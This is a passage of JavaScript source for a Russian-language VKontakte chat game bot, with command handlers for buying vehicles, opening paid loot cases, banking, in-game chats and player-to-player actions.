 }); 
 ////Т

 vk.updates.hear(/^(?:самолеты)\s?([1-9]+)?/i,(message) => {  

 	let user = acc.users[user_id(message.user)];  
	let houses = ['Коробка', 'Подвал' , 'Палатка','Домик на дереве','Полуразрушенный Дом','Дом в лесу'] // car
	for(z in houses){
		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
	}
if(user.ffffsasa == false) return message.send(`❗ У Вас нет паспорта ! Получите в мерии BigWars !\nНапишите " Мэрия "`);
 	if(user.house == false) return message.send(`👉 ➾ Для покупки вертолета Вам нужен дом!`); /// ДОМ НЕ НИЖЕ 7
 	if(!message.$match[1]){
 		return message.send(`
 			➕ 1&#8419;. Fokker DR1 Triplane - 30.000.000$
 			➕ 2&#8419;. Mitsubishi A6M Zero - 85.000.000$
 			➕ 3&#8419;. Су-35С - 90.000.000$ 

 			✈ ➾ Для покупки напишите: Самолеты [номер] 
 			👉 ➾ Самолет продать - для продажи.
 			👉 ➾ При продаже вернется 75% от суммы.
 			`)
 	}
 	let i = message.$match[1]; 
 	let ids = [0,1,2,3,4,5,6,7,8,9,10]
 	let count = [0, 30000000,85000000,90000000];
 	let names = [0, 'Fokker DR1 Triplane','Mitsubishi A6M Zero','Су-35С']
 	if(i < 0 || i > 3) return;
 	if(user.aircraft != false) return message.send(`✈ ➾ У вас уже куплен самолет`);
 	if(i > 0 && i <= 3){
 		if(user.balance < count[i]) return message.send(`✈ ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.aircraft = ids[i];
 		return message.send(`✈ ➾ Вы купили самолет (${names[i]}) за ${count[i]}$`)
 	} 
 }); 
 

 vk.updates.hear(/^(?:самолет продать)/i,  (message) => {
 	let count = [0, 30000000,85000000,90000000];
 	let user = acc.users[user_id(message.user)];
 	if(user.aircraft == false) return message.send(`✈ ➾ У вас нет самолета`)
 		let sum = count[user.aircraft] / 100 * 75;
 	user.balance += sum;
 	user.aircraft = false;
 	return message.send(`✈ ➾ Вы продали свой самолет за ${sum}$`)
 });

 vk.updates.hear(/^(?:вертолет продать)/i,  (message) => {
 	let count = [0, 50000000,15000000,35000000,39000000,43000000,50000000,6500000,80000000];
 	let user = acc.users[user_id(message.user)];
 	if(user.helicopter == false) return message.send(`🚁 ➾ У вас нет вертолета`)
 		let sum = count[user.helicopter] / 100 * 75;
 	user.balance += sum;
 	user.helicopter = false;
 	return message.send(`🚁 ➾ Вы продали свой вертолет за ${sum}$`)
 });





 vk.updates.hear(/^(?:зоткрыть)/i, (message) => { 
 	let user = acc.users[user_id(message.user)];
 	if(user.his < 1) return message.send(`📦 У вас нет ни одной бесплатной прокрутки данного кейса !`);
 	user.his -= 1;
 	let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27].random();
 	if(rez == 1){
 		let text = [].random(); 
 		user.bitcoin += 250000;
 		return message.send(`📦 Открыв кейс, вы получили: 250.000 биткоинов !`);
 	}
 	if(rez == 2){
 		let text = [].random(); 
 		user.donate += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 3){
 		let text = [].random(); 
 		user.aaa += 20;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 4){
 		let text = [].random(); 
 		user.balance += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 5){
 		let text = [].random(); 
 		user.balance += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 6){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 7){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 8){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 9){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 10){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 11){
 		let text = [].random(); 
 		user.aaa += 20;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 12){
 		let text = [].random(); 
 		user.aaa += 20;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 13){
 		let text = [].random(); 
 		user.aaa += 20;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 14){
 		let text = [].random(); 
 		user.balance += 50000000000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000.000.000 $ !`);
 	}
 	if(rez == 15){
 		let text = [].random(); 
 		user.aaa += 20;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 16){
 		let text = [].random(); 
 		user.aaa += 10;
 		return message.send(`📦 Открыв кейс, вы получили: 20 метеорита !`);
 	}
 	if(rez == 17){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 18){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 19){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 20){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 21){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 22){
 		let text = [].random(); 
 		user.qqq += 50000;
 		return message.send(`📦 Открыв кейс, вы получили: 50.000 наркоты !`);
 	}
 	if(rez == 21){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 22){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 23){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 24){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 25){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 26){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}
 	if(rez == 27){
 		let text = [].random(); 
 		user.bitcoin += 0;
 		return message.send(`📦 Увы(\nВам нечего не выпало`);
 	}

 }); 


///

///

vk.updates.hear(/^(?:дкейсы)$/i,  (message) => { 
	return message.send(`
		👝 Золотой кейс содержит:

		👑 - 250.000 биткоинов
		👑-  50.000.000.000 $
		👑-  20 метеорита 
		👑- 50.000 наркотиков
		👑- СТАТУС " МОДЕРАТОР " ( ГЛАВНЫЙ ПРИЗ ).

		📦 Чтобы открыть данный кейс, напиши " Зоткрыть "
		🔆 Стоимость одной прокрутки: 15 рублей

		💎👝 Бриллиантовый кейс содержит:
		💎- 100.000.000.000 $
		💎- 500.000 биткоинов
		💎- 26 метеорита 
		💎- 1500 рубинов
		💎- 100.000 наркоты
		💎- 5 раз бесплатной прокрутки данного кейса
		💎- Статус " АДМИНИСТРАТОР " [ГЛАВНЫЙ ПРИЗ]

		📦 Чтобы открыть данный кейс, напиши " Боткрыть "
		🔆 Стоимость одной прокрутки: 25 рублей

		🧿👝 Эпический кейс содержит: 
		🧿- 100.000.000.000 $ 
		🧿- 500.000 биткоинов 
		🧿- 26 метеорита 
		🧿- 1500 рубинов 
		🧿- 100.000 наркоты 
		🧿- 5 раз бесплатной прокрутки данного кейса 
		🧿- Статус " АДМИНИСТРАТОР " [ГЛАВНЫЙ ПРИЗ] 
		🧿- 300.000.000 $
		🧿- 150.000.000 $
		🧿- + 3 прокрутки 
		🧿- 10.000.000.000 $
		🧿- 80.000.000 $

		📦 Чтобы открыть данный кейс, напиши " Эоткрыть " 
		🔆 Стоимость одной прокрутки: 80 рублей 





		`)
});	
vk.updates.hear(/^(?:фкейсы)$/i,  (message) => { 
	return message.send(`
		🍔 Кейс " Бургер " 
		Стоимость: 1.000.000 $
		Информация: Простой, дешевый кейс для игроков , которые хотят СОЧНЫЙ бургер !
		Данный кейс содержит:
		- 1.500.000 $
		- 2.500.000 $
		- 4.500.000 $
		- 6.500.000 $
		🍔Чтобы открыть данный кейс, напишите " Бургеркейс "

		* * * * * *****************************
		👓 Кейс " Мажор "
		Стоимость: 5.000.000 $
		Информация: Кейс для богатых чуваков которые кидают деньги как хотят!
		Данный кейс содержит:
		- 6.000.000 $
		- 7.000.000 $
		- 8.000.000 $
		- 10.000.000 $
		👓Чтобы открыть данный кейс, напишите " Мажоркейс "


		♻ Приглашай друзей - получай админку, випку и тд. Подробнее " ринфо " 
		P.s чтобы открыть кейсы, нужно иметь 2 уровень :)



		`)
});	
///// АДМИН КОМАНДЫ - - - -- - - 











vk.updates.hear(/^(?:репорт|report|rep|вопрос)\s?([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ вы не написали жалобу | репорт [текст]`);
	if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
	user.bloks.rukus = true
	setTimeout(() => {
		user.bloks.rukus = false
	}, 55000);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].ap >= 3){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: `👨‍💻 ➾ [НОВАЯ ЖАЛОБА/ВОПРОС]\n👨‍💻 ➾ ID игрока: ${user_id(message.user)}\n👨‍💻 ➾ Жалоба: ${message.$match[1]}\n👨‍💻 ➾ [Для ответа: ответ [ID] [TEXT]`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`🛑 ▶ Ваш репорт был отправлен модераторам'.\nВ течении несколько минут , администрация Вам ответит.\nВы также можете посмотреть список админов/модераторов которые сейчас вышли на пост ! Для этого напишите " адмонли "`);
});

vk.updates.hear(/^(?:чп)\s?([^]+)?/i, (message) => {		
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`А текст после " чп " кто будет писать?!`);
	if(user.banan16 < 10) return message.send(`🔸 ➾ Вы не находитесь в парке !`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].banan16 >= 10){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: `< ⛳ >: [В ПАРКЕ]\n🏜 ➾ ID игрока: ${user_id(message.user)}\n🏜 Сообщение:: ${message.$match[1]}\n♻ Если хотите выйти с парка, напишите " выходпарк "`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`🏜 Вы сказали в парке...`);
});


vk.updates.hear(/^(?:rs)\s?([^]+)?/i, (message) => {		
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`А текст после " rs " кто будет писать?!`);
	if(user.upi564456465s < 10) return message.send(` ➾ Вы не находитесь в радио центре !`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].upi564456465s >= 10){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: `< 🎵  >: [В РАДИО ЦЕНТРЕ]\n🎵 ➾ ID игрока: ${user_id(message.user)}\n🎵  Сообщение:: ${message.$match[1]}\n🎵  Если хотите выйти с радио центре, напишите " рвыход"`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`🎵  Вы сказали в радио центре ...`);
});

vk.updates.hear(/^(?:кч)\s?([^]+)?/i, (message) => {		
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`А текст после " кч " кто будет писать?!`);
	if(user.kvest13 < 10) return message.send(`🔸 ➾ Вы не находитесь в клубе !`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].kvest13 >= 10){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: `< 💈 >: [В КЛУБЕ]\n💈 ➾ ID игрока: ${user_id(message.user)}\n💈 Сообщение:: ${message.$match[1]}\n💈 Если хотите выйти с клуба, напишите " квыход "`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`💈 Вы крикнули в клубе ...`);
});
vk.updates.hear(/^(?:бч)\s?([^]+)?/i, (message) => {		
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`А текст после " бч " кто будет писать?!`);
	if(user.banan19 < 10) return message.send(`🔸 ➾ Вы не находитесь на баскетбольной плащадке !`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a);

	for(i=0;i<200000;i++){
		if(acc.users[i]){
			if(acc.users[i].banan19 >= 10){ 
				vk.api.call("messages.send", {
					peer_id: acc.users[i].id,
					message: `< 🏀 >: [НА БАСКЕТБОЛЕ]\n🏀 ➾ ID игрока: ${user_id(message.user)}\n🏀 Сообщение:: ${message.$match[1]}\n🏀 Если хотите выйти с клуба, напишите " бвыход "`, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('report error'); });	
			}
		}
	}
	return message.send(`🏀 Вы крикнули на баскетбольной площадке ...`);
});




	//=====================================================================
	vk.updates.hear(/^(?:43о)\s?([^]+)?/i, (message) => { 
		if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
			let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`А текст после " о " кто будет писать?!`);
		if(user.chat < 1) return message.send(`🔸 ➾ У Вас отключен общий чат ! Включите командой " vkla "`);
		let a = zapret(message.$match[1]);
		if(a != 0) return message.send(a);

		for(i=0;i<200000;i++){
			if(acc.users[i]){
				if(acc.users[i].chat >= 1){ 
					vk.api.call("messages.send", {
						peer_id: acc.users[i].id,
						message: `🌍 [OOC]\n🌈 ID игрока: ${user_id(message.user)}\n🌱 Сообщение:: ${message.$match[1]}\n`,random_id: 0
					}).then((res) => {}).catch((error) => {console.log('report error'); });	
				}
			}
		}
		return message.send(`💌 VIP сообщение успешно отправлено:`);
	});

	vk.updates.hear(/^(?:респект)\s?([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: респект +/-\n🔸 ➾ [+ -> хороший ответ/ - -> плохой ответ]`);
		if(user.rep.status == false) return message.send(`🔸 ➾ Проверьте вводимые данные.`); 
		if(message.$match[1] == '+' || message.$match[1] == '-'){
			user.rep.status = false; 
			if(message.$match[1] == '+') acc.users[user.rep.id].ainfo.good_ans += 1; 
			if(message.$match[1] == '-') acc.users[user.rep.id].ainfo.bad_ans += 1;  
			let id = user.rep.id;
			user.rep.id = false;
			return message.send(`🔸 ➾ Вы успешно оценили ответ \n🔸 ➾ Администратора [${acc.users[id].prefix}] - ${message.$match[1].toString().replace(/\+/gi, 'Положительно').replace(/-/gi, 'Отрицательно')}.`)

		}
		return message.send(`🔸 ➾ Проверьте вводимые данные.`); 
	});









	vk.updates.hear(/^(?:msms)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.volftube8 == false) return message.send(`📱 У вас нет телефона !`);
		if(user.volftube9 == false) return message.send(`📱 У вас нет симки ! Чтобы купить, напишите " buysim "`);
		if(user.fdfd < 1000) return message.send(`📱 У вас не достаточно денежные средств на балансе телефона !\nЧтобы пополнить баланс, напишите "мпополнить [сумма]"`);
		if(!Number(message.$match[1]) || !message.$match[1] || !message.$match[2] || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
		if(acc.users[message.$match[1]].volftube8 == false) return message.send(`📱 У данного игрока нет телефона !`);
		if(acc.users[message.$match[1]].volftube9 == false) return message.send(`📱 У данного игрока нет симки !`);
		let a = zapret(message.$match[2]);
		if(a != 0) return message.send(a); 
		vk.api.call("messages.send", {
			peer_id: acc.users[message.$match[1]].id,
			message: `📱 ➾ Игрок: ${user.prefix} отправил вам смс сообщение:\n📱 ${message.$match[2]}`,random_id: 0
		}).then((res) => {}).catch((error) => {console.log('ans error'); });	
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		user.ainfo.all_ans += 1;
		user.ainfo.ans += 1;
		acc.users[message.$match[1]].rep.status = true;
		acc.users[message.$match[1]].rep.id = Number(user_id(message.user));
		return message.send(`📱 ➾ Смс отправлено ( - 1000 $ ).`)
	});


	vk.updates.hear(/^(?:Фото)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`➾ Пример команды: фото [ID] [ID фотки вк]`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			attachment: `https://vk.com/photo530903911_456241952`, 
			message: `Игрок ${user.prefix} показал Вам свое фото.\n ➾ ID фотки: ${message.$match[2]}\n`,random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`Вы показли свое фото данному игроку.\nКод фото: ${message.$match[2]}`);
	}); 
	
	vk.updates.hear(/^(?:кусь)\s?([0-9]+)?\s([^]+)?/i, (message) => {  
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: кусь [ID] [за что укусить]`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `💥 Игрок ${user.prefix} укусил Вас за ${message.$match[2]}`,random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`Вы укусили игрока за ${message.$match[2]}`);
	}); 



	vk.updates.hear(/^(?:!set)\s?([0-9]+)?/i, message => {
		let user = acc.users[user_id(message.user)];
		if(user.kvest21 != true) return message.send(`⛔ У вас нет статуса " донатер " ! Приобрети его в " донат "`);
		if(user.bloks.giverub == true) return message.send(`💰 ➾ Выдавать валюту можно раз в час`);
		if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 1000000000) return message.send(`💰 ➾ Пример: '!set [1-1.000.000.000 $]'`);
		user.balance += Number(message.$match[1]);
		user.bloks.giverub = true;
		setTimeout(() => {
			user.bloks.giverub = false;
		}, 3600000);

		return message.send(`💰 ➾ Вы выдали себе ${spaces(message.$match[1])}$`);
	});
	vk.updates.hear(/^(?:!pitme)\s?([^]+)?/i, message => {
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: !pitme [название]`);
		if(user.kvest21 != true) return message.send(`⛔ У вас нет статуса " донатер " ! Приобрети его в " донат "`)
			user.pit = (message.$match[1]);

		return message.send(`Вы выдали себе питомца: ${(message.$match[1])}`);
	});
//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===




//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===
//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===
//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===//===
vk.updates.hear(/^(?:положить)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.bank <= -1) return message.send(`🚨 Произошла ошибка ! ⚠ Чтобы устранить данную ошибку, напишите " ас "`);
	if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 200000000000) return message.send(`💰 ➾ Пример: 'положить сумма' ( Ложить можно до 2.000.000 )`);
			user.balance -= Number(message.$match[1]);
			user.bank += Number(message.$match[1]);
		}
		return message.send(`Вы положили в банк ${spaces(message.$match[1])}$`);
	});
vk.updates.hear(/^(?:кпополнить)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.bank <= -1) return message.send(`🚨 Произошла ошибка ! ⚠ Чтобы устранить данную ошибку, напишите " ас "`);
	if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 1500000) return message.send(`💰 ➾ Пример: 'кпополнить' ( лимит 1.500.000 $ )`);
			user.balance -= Number(message.$match[1]);
			user.karta += Number(message.$match[1]);
		}
		return message.send(`Вы положили на карту ${spaces(message.$match[1])}$`);
	});
vk.updates.hear(/^(?:мпополнить)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.volftube8 == false) return message.send(`📱 У вас нет телефона !`);
	if(user.volftube9 == false) return message.send(`📱 У вас нет симки ! Чтобы купить, напишите " buysim "`);
	if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 15000) return message.send(`💰 ➾ Пример: 'мпополнить' ( лимит 15.0000 $ )`);
			user.balance -= Number(message.$match[1]);
			user.fdfd += Number(message.$match[1]);
		}
		return message.send(`Вы положили на мобильный счет ${spaces(message.$match[1])}$`);
	});
vk.updates.hear(/^(?:конкурс)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 20000000000000) return message.send(`💰 ➾ Пример: 'конкурс сумма' ( Ложить можно до 2.000.000 )`);
			user.balance -= Number(message.$match[1]);
			user.xd += Number(message.$match[1]);
		}
		return message.send(`Вы положили в банк конкурса ${spaces(message.$match[1])}$`);
	});
vk.updates.hear(/^(?:снять)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.bank <= -1) return message.send(`🚨 Произошла ошибка ! ⚠ Чтобы устранить данную ошибку, напишите " ас " !`);
	if(user.bank < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 20000000000) return message.send(`💰 ➾ Пример: 'снять сумма'( снимать можно до 2.000.000 )`);
			user.bank -= Number(message.$match[1]);
			user.balance += Number(message.$match[1]);
		}
		return message.send(`Вы сняли ${spaces(message.$match[1])}$`);
	});
vk.updates.hear(/^(?:кснять)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.karta <= -1) return message.send(`🚨 Произошла ошибка ! ⚠ Чтобы устранить данную ошибку, напишите " ас " !`);
	if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.karta < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 100000) return message.send(`💰 ➾ Пример: 'кснять'( снимать можно до 100.000)`);
			user.karta -= Number(message.$match[1]);
			user.balance += Number(message.$match[1]);
		}
		return message.send(`Вы сняли ${spaces(message.$match[1])}$ с карты !`);
	})

vk.updates.hear(/^(?:Жалоба)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`Пример команды: Жалоба ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.bloks.zlom == true) return message.send(`Попробуйте позже.`);
	user.bloks.zlom = true
	setTimeout(() => {
		user.bloks.zlom = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `` ,random_id: 0
		});
	}, 300000);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].almin23 += 1; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Игрок ${user.prefix} пожаловался на Ваш аккаунт.`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы кинули жалобу на игрока [${acc.users[message.$match[1]].prefix}]`);
});	

vk.updates.hear(/^(?:Пподарить)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: пподарить ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.pit == false) return message.send(`У вас нет питомца`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	user.pit = false;
	acc.users[message.$match[1]].pit = user.pit; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Игрок ${user.prefix} подарил вам своего питомца !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы подарили своего питомца игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:пвсе)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: передать все ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.balance < 1) return message.send(`У тебя нет денег !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	user.pit = false;
	acc.users[message.$match[1]].balance += user.balance; 
	user.balance -= user.balance;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Игрок ${user.prefix} передал Вам все его деньги !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы отдали все деньги игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:Ккинуть)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ккинуть ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` Игрок ${user.prefix} кинул вам в морду камень !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Вы кинули в морду камень игроку [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:март)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: март ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💟💟💟Игрок ${user.prefix} поздравил Вас с 8 марта !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💟💟💟 Вы поздравили игрока [${acc.users[message.$match[1]].prefix}] с 8 марта !`);
});	
vk.updates.hear(/^(?:Жопа)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: жопа ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
